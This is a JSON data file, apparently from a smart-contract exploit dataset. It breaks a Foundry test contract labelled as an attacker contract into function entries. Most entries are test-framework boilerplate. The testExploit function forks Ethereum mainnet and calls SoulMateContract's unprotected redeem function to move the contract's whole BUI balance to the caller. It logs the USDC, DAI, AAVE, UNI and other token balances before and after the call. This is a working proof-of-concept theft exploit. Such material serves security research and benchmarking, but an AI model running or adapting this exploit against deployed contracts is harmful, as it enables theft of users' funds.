[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_063_676);\n        vm.label(address(SoulMateContract), \"SoulMateContract\");\n        vm.label(address(BUI), \"BUI\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(MATIC), \"MATIC\");\n        vm.label(address(AAVE), \"AAVE\");\n        vm.label(address(ENS), \"ENS\");\n        vm.label(address(ZRX), \"ZRX\");\n        vm.label(address(UNI), \"UNI\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter USDC balance before attack\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\"Exploiter DAI balance before attack\", DAI.balanceOf(address(this)), DAI.decimals());\n        emit log_named_decimal_uint(\n            \"Exploiter MATIC balance before attack\", MATIC.balanceOf(address(this)), MATIC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Exploiter AAVE balance before attack\", AAVE.balanceOf(address(this)), AAVE.decimals()\n        );\n        emit log_named_decimal_uint(\"Exploiter ENS balance before attack\", ENS.balanceOf(address(this)), ENS.decimals());\n        emit log_named_decimal_uint(\"Exploiter ZRX balance before attack\", ZRX.balanceOf(address(this)), ZRX.decimals());\n        emit log_named_decimal_uint(\"Exploiter UNI balance before attack\", UNI.balanceOf(address(this)), UNI.decimals());\n\n        // No access control\n        SoulMateContract.redeem(BUI.balanceOf(address(SoulMateContract)), address(this));\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDC balance after attack\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\"Exploiter DAI balance after attack\", DAI.balanceOf(address(this)), DAI.decimals());\n        emit log_named_decimal_uint(\n            \"Exploiter MATIC balance after attack\", MATIC.balanceOf(address(this)), MATIC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Exploiter AAVE balance after attack\", AAVE.balanceOf(address(this)), AAVE.decimals()\n        );\n        emit log_named_decimal_uint(\"Exploiter ENS balance after attack\", ENS.balanceOf(address(this)), ENS.decimals());\n        emit log_named_decimal_uint(\"Exploiter ZRX balance after attack\", ZRX.balanceOf(address(this)), ZRX.decimals());\n        emit log_named_decimal_uint(\"Exploiter UNI balance after attack\", UNI.balanceOf(address(this)), UNI.decimals());\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ISoulMateContract",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "",
    "description": ""
  }
]